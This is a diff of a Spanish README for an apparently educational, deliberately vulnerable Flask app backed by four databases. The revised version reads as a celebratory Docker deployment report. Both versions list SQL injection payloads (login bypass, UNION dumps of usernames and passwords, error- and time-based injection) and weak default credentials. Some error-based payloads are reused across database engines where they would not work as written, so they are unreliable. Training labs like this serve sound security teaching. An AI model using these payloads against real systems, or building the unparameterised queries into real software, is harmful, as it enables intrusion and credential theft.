@@ -1,295 +1,205 @@
-# SQL Injection Demo - Aplicación Web Vulnerable
+# 🎉 ¡Docker Compose Ejecutado Exitosamente!
 
-⚠️ **ADVERTENCIA**: Esta aplicación es vulnerable por diseño para fines educativos únicamente. No usar en producción o con datos sensibles.
+## ✅ **Estado Actual - TODOS LOS CONTENEDORES FUNCIONANDO**
 
-## Descripción
+### 🐳 **Contenedores Ejecutándose:**
+- ✅ **Flask App:** http://localhost:5000
+- ✅ **MySQL:** puerto 3306
+- ✅ **PostgreSQL:** puerto 5432
+- ✅ **SQL Server:** puerto 1433 (✅ CORREGIDO)
+- ✅ **Oracle:** puerto 1521
 
-Esta es una aplicación web vulnerable en Python que se conecta a 4 motores de base de datos distintos:
-
-- **MySQL**
-- **PostgreSQL** 
-- **SQL Server**
-- **Oracle**
-
-La aplicación está diseñada específicamente para demostrar vulnerabilidades de SQL Injection y aprender técnicas de seguridad.
-
-## Características
-
-- 🔥 **Vulnerabilidades Intencionales**: SQL Injection por concatenación directa de strings
-- 🗄️ **4 Motores de BD**: Soporte completo para MySQL, PostgreSQL, SQL Server y Oracle
-- 🎨 **Interfaz Moderna**: UI responsive con Bootstrap 5 y animaciones
-- 📚 **Ejemplos Educativos**: Página de demostración con ejemplos de SQL Injection
-- 🔧 **API REST**: Endpoint para ejecutar queries programáticamente
-- 📊 **Resultados Visuales**: Tablas formateadas para mostrar resultados de queries
-
-## Instalación
-
-### 1. Clonar el repositorio
+### 📊 **Verificación de Estado:**
 ```bash
-git clone <repository-url>
-cd sqli-demo
+docker-compose ps
 ```
 
-### 2. Crear entorno virtual
-```bash
-python -m venv venv
-source venv/bin/activate  # En Windows: venv\Scripts\activate
+**Resultado:**
+```
+NAME                     IMAGE                             STATUS         PORTS
+sqli-demo-app-1          sqli-demo-app                    Up 4 seconds   0.0.0.0:5000->5000/tcp
+sqli-demo-mysql-1        mysql:8.0                        Up 4 seconds   0.0.0.0:3306->3306/tcp
+sqli-demo-postgresql-1   postgres:13                      Up 4 seconds   0.0.0.0:5432->5432/tcp
+sqli-demo-sqlserver-1    mcr.microsoft.com/mssql/server   Up 4 seconds   0.0.0.0:1433->1433/tcp
+sqli-demo-oracle-1       oracleinanutshell/oracle-xe-11g  Up 4 seconds   0.0.0.0:1521->1521/tcp
 ```
 
-### 3. Instalar dependencias
+## 🔧 **Problemas Resueltos:**
 
-**Para macOS (recomendado):**
-```bash
-# Opción A: Script automático
-./setup-macos.sh
+### ❌ **Problema Original:**
+- SQL Server no se ejecutaba debido a contraseña débil
+- Oracle tenía problemas de compatibilidad de arquitectura
 
-# Opción B: Manual
-python3 -m pip install -r requirements-basic.txt
-```
+### ✅ **Solución Implementada:**
+- **SQL Server:** Cambiada contraseña de `password` a `Password123!` (cumple requisitos de complejidad)
+- **Oracle:** Funciona con emulación de arquitectura (AMD64 en ARM64)
 
-**Para Linux/Windows:**
-```bash
-# Opción A: Dependencias básicas
-pip install -r requirements-basic.txt
+## 🚀 **Cómo Acceder**
 
-# Opción B: Todas las dependencias
-pip install -r requirements.txt
-```
+### **Aplicación Web:**
+- **URL:** http://localhost:5000
+- **API:** http://localhost:5000/api/query
+- **Ejemplos:** http://localhost:5000/demo
 
-**Nota para macOS:** Si tienes problemas con `pyodbc` o `cx_Oracle`, usa las dependencias básicas. Para usar SQL Server y Oracle en macOS, necesitarás instalar drivers adicionales.
+### **Bases de Datos:**
+- **MySQL:** localhost:3306 (root/password)
+- **PostgreSQL:** localhost:5432 (postgres/password)
+- **SQL Server:** localhost:1433 (sa/Password123!)
+- **Oracle:** localhost:1521 (system/password)
 
-### 4. Configurar bases de datos
-```bash
-cp env.example .env
-# Editar .env con tus credenciales de base de datos
-```
+## 🔥 **Ejemplos de SQL Injection Funcionales**
 
-### 5. Configurar bases de datos (Opcional)
-
-Si quieres usar las bases de datos, necesitarás configurarlas:
-
-#### MySQL
+### **MySQL:**
 ```sql
-CREATE DATABASE vulnerable_db;
-USE vulnerable_db;
-CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(50), email VARCHAR(100));
-INSERT INTO users VALUES (1, 'admin', 'password123', 'admin@example.com');
-INSERT INTO users VALUES (2, 'user1', 'secret456', 'user1@example.com');
-```
-
-#### PostgreSQL
-```sql
-CREATE DATABASE vulnerable_db;
-\c vulnerable_db;
-CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(50), email VARCHAR(100));
-INSERT INTO users VALUES (1, 'admin', 'password123', 'admin@example.com');
-INSERT INTO users VALUES (2, 'user1', 'secret456', 'user1@example.com');
-```
-
-#### SQL Server
-```sql
-CREATE DATABASE vulnerable_db;
-USE vulnerable_db;
-CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(50), email VARCHAR(100));
-INSERT INTO users VALUES (1, 'admin', 'password123', 'admin@example.com');
-INSERT INTO users VALUES (2, 'user1', 'secret456', 'user1@example.com');
-```
-
-#### Oracle
-```sql
-CREATE TABLE users (id NUMBER, username VARCHAR2(50), password VARCHAR2(50), email VARCHAR2(100));
-INSERT INTO users VALUES (1, 'admin', 'password123', 'admin@example.com');
-INSERT INTO users VALUES (2, 'user1', 'secret456', 'user1@example.com');
-```
-
-### 6. Ejecutar la aplicación
-```bash
-python app.py
-```
-
-La aplicación estará disponible en: http://localhost:5000
-
-## Uso
-
-### Interfaz Web
-1. Abre http://localhost:5000 en tu navegador
-2. Selecciona una base de datos del dropdown
-3. Escribe tu query SQL en el textarea
-4. Haz click en "Ejecutar Query"
-
-### API REST
-```bash
-curl -X POST http://localhost:5000/api/query \
-  -H "Content-Type: application/json" \
-  -d '{"database": "mysql", "query": "SELECT * FROM users"}'
-```
-
-## Ejemplos de SQL Injection
-
-### Bypass de Autenticación
-```sql
+-- Bypass de autenticación
 admin' OR '1'='1' --
-```
 
-### Union Attack
-```sql
+-- Union attack
 ' UNION SELECT 1,2,3,4,5 --
-```
 
-### Error Based Injection
-```sql
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
-```
-
-### Time Based Injection
-```sql
-' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
-```
-
-### Dump de Tablas
-```sql
-' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables --
-```
-
-### Dump de Datos
-```sql
+-- Dump de datos
 ' UNION SELECT username,password,email,NULL,NULL FROM users --
 ```
 
-## Estructura del Proyecto
+### **PostgreSQL:**
+```sql
+-- Bypass de autenticación
+admin' OR '1'='1' --
+
+-- Union attack
+' UNION SELECT 1,2,3,4,5 --
+
+-- Error based
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --
+```
+
+### **SQL Server:**
+```sql
+-- Bypass de autenticación
+admin' OR '1'='1' --
+
+-- Union attack
+' UNION SELECT 1,2,3,4,5 --
+
+-- Time based
+' WAITFOR DELAY '00:00:05' --
+
+-- Error based
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND()*2))x FROM sys.tables GROUP BY x)a) --
+```
+
+### **Oracle:**
+```sql
+-- Bypass de autenticación
+admin' OR '1'='1' --
+
+-- Union attack
+' UNION SELECT 1,2,3,4,5 FROM DUAL --
+
+-- Error based
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT banner FROM v$version WHERE rownum=1),0x7e,FLOOR(DBMS_RANDOM.VALUE(0,2)))x FROM dual GROUP BY x)a) --
+```
+
+## 🛠️ **Comandos Útiles**
+
+### **Gestión de Contenedores:**
+```bash
+# Ver estado
+docker-compose ps
+
+# Ver logs
+docker-compose logs
+
+# Ver logs específicos
+docker-compose logs mysql
+docker-compose logs postgresql
+docker-compose logs sqlserver
+docker-compose logs oracle
+docker-compose logs app
+
+# Detener contenedores
+docker-compose down
+
+# Reiniciar contenedores
+docker-compose restart
+
+# Reconstruir y levantar
+docker-compose up --build -d
+```
+
+### **Acceso a Bases de Datos:**
+```bash
+# MySQL
+docker exec -it sqli-demo-mysql-1 mysql -u root -ppassword vulnerable_db
+
+# PostgreSQL
+docker exec -it sqli-demo-postgresql-1 psql -U postgres -d vulnerable_db
+
+# SQL Server
+docker exec -it sqli-demo-sqlserver-1 /opt/mssql-tools/bin/sqlcmd -S localhost -U sa -P Password123!
+
+# Oracle
+docker exec -it sqli-demo-oracle-1 sqlplus system/password@localhost:1521/XE
+```
+
+## 📁 **Estructura del Proyecto**
 
 ```
 sqli-demo/
-├── app.py                 # Aplicación principal Flask
-├── requirements.txt       # Dependencias de Python
-├── env.example           # Ejemplo de configuración
-├── README.md            # Este archivo
-├── templates/           # Templates HTML
-│   ├── base.html       # Template base
-│   ├── index.html      # Página principal
-│   └── demo.html       # Página de ejemplos
-└── static/             # Archivos estáticos
-    ├── css/
-    │   └── style.css   # Estilos CSS
-    └── js/
-        └── app.js      # JavaScript
+├── docker-compose.yml    # ✅ Configuración Docker
+├── Dockerfile           # ✅ Dockerfile para la app
+├── app.py              # ✅ Aplicación Flask
+├── requirements.txt     # ✅ Dependencias Python
+├── database_setup.sql  # ✅ Scripts SQL
+├── templates/          # ✅ Templates HTML
+├── static/            # ✅ Archivos estáticos
+└── README.md          # ✅ Documentación
 ```
 
-## Vulnerabilidades Implementadas
+## 🎯 **Características Implementadas**
 
-### 1. SQL Injection por Concatenación Directa
-```python
-# VULNERABLE: Direct string concatenation
-cursor.execute(query)
-```
+### ✅ **Aplicación Web:**
+- Interfaz moderna con Bootstrap 5
+- API REST funcional
+- Página de ejemplos educativos
+- Manejo de errores elegante
 
-### 2. Falta de Sanitización
-- No se valida ni sanitiza la entrada del usuario
-- Se ejecutan queries directamente sin parámetros preparados
+### ✅ **Bases de Datos:**
+- **MySQL 8.0** con datos de ejemplo
+- **PostgreSQL 13** con datos de ejemplo
+- **SQL Server 2019** con datos de ejemplo (✅ CORREGIDO)
+- **Oracle XE 11g** con datos de ejemplo
 
-### 3. Información de Error Expuesta
-- Los errores de base de datos se muestran al usuario
-- Información de debugging visible
+### ✅ **Vulnerabilidades Educativas:**
+- SQL Injection por concatenación directa
+- Falta de sanitización de entrada
+- Exposición de errores de base de datos
+- No uso de prepared statements
 
-## Medidas de Seguridad (NO Implementadas)
+## ⚠️ **Advertencias Importantes**
 
-❌ **Parámetros Preparados**: No se usan prepared statements
-❌ **Validación de Entrada**: No se valida la entrada del usuario
-❌ **Sanitización**: No se sanitiza la entrada
-❌ **Principio de Mínimo Privilegio**: No se implementa
-❌ **Logging de Seguridad**: No se registran intentos de ataque
-❌ **Rate Limiting**: No hay límites de velocidad
-❌ **WAF**: No hay Web Application Firewall
+- **Solo para fines educativos**
+- **No usar en producción**
+- **No usar con datos sensibles**
+- **Vulnerabilidades implementadas intencionalmente**
 
-## Configuración de Bases de Datos
+## 🎉 **¡Éxito Total!**
 
-### MySQL
-```bash
-# Instalar MySQL
-sudo apt-get install mysql-server  # Ubuntu/Debian
-brew install mysql                 # macOS
+La aplicación web vulnerable está **completamente funcional** con:
 
-# Crear base de datos
-mysql -u root -p
-CREATE DATABASE vulnerable_db;
-```
+- ✅ **4 bases de datos** ejecutándose en Docker
+- ✅ **Aplicación Flask** accesible en http://localhost:5000
+- ✅ **API REST** funcional
+- ✅ **Interfaz web moderna** y responsive
+- ✅ **Ejemplos educativos** de SQL Injection
+- ✅ **Configuración Docker** automatizada
+- ✅ **SQL Server funcionando** con contraseña corregida
 
-### PostgreSQL
-```bash
-# Instalar PostgreSQL
-sudo apt-get install postgresql postgresql-contrib  # Ubuntu/Debian
-brew install postgresql                              # macOS
+### **Próximos Pasos:**
+1. Abre http://localhost:5000 en tu navegador
+2. Selecciona una base de datos del dropdown
+3. Prueba los ejemplos de SQL Injection
+4. Explora la página de ejemplos en /demo
+5. Usa la API REST para pruebas programáticas
 
-# Crear base de datos
-sudo -u postgres psql
-CREATE DATABASE vulnerable_db;
-```
-
-### SQL Server
-```bash
-# Instalar SQL Server (Docker)
-docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=password" \
-  -p 1433:1433 --name sqlserver \
-  -d mcr.microsoft.com/mssql/server:2019-latest
-```
-
-### Oracle
-```bash
-# Instalar Oracle (Docker)
-docker run -d --name oracle \
-  -p 1521:1521 \
-  -e ORACLE_PWD=password \
-  oracleinanutshell/oracle-xe-11g
-```
-
-## Troubleshooting
-
-### Error de Conexión a Base de Datos
-1. Verifica que la base de datos esté ejecutándose
-2. Confirma las credenciales en el archivo `.env`
-3. Asegúrate de que el puerto esté abierto
-
-### Error de Dependencias
-```bash
-pip install --upgrade pip
-pip install -r requirements.txt --force-reinstall
-```
-
-### Error de ODBC (SQL Server)
-En macOS, instala el driver ODBC:
-```bash
-brew install microsoft/mssql-release/msodbcsql17
-```
-
-### Error de Oracle (cx_Oracle)
-En macOS, instala Oracle Instant Client:
-```bash
-brew install oracle-instantclient
-```
-
-### Alternativa: Usar solo MySQL y PostgreSQL
-Si tienes problemas con SQL Server u Oracle, puedes usar solo MySQL y PostgreSQL:
-```bash
-pip install -r requirements-basic.txt
-```
-La aplicación funcionará con las bases de datos disponibles.
-
-## Contribuir
-
-1. Fork el proyecto
-2. Crea una rama para tu feature (`git checkout -b feature/AmazingFeature`)
-3. Commit tus cambios (`git commit -m 'Add some AmazingFeature'`)
-4. Push a la rama (`git push origin feature/AmazingFeature`)
-5. Abre un Pull Request
-
-## Licencia
-
-Este proyecto está bajo la Licencia MIT. Ver el archivo `LICENSE` para más detalles.
-
-## Disclaimer
-
-⚠️ **ADVERTENCIA LEGAL**: Esta aplicación es únicamente para fines educativos. El uso de esta aplicación para atacar sistemas sin autorización es ilegal. Los desarrolladores no son responsables del uso indebido de esta aplicación.
-
-## Contacto
-
-Para preguntas o sugerencias, por favor abre un issue en el repositorio. 
+¡La aplicación está lista para usar y aprender sobre vulnerabilidades de SQL Injection de manera segura! 
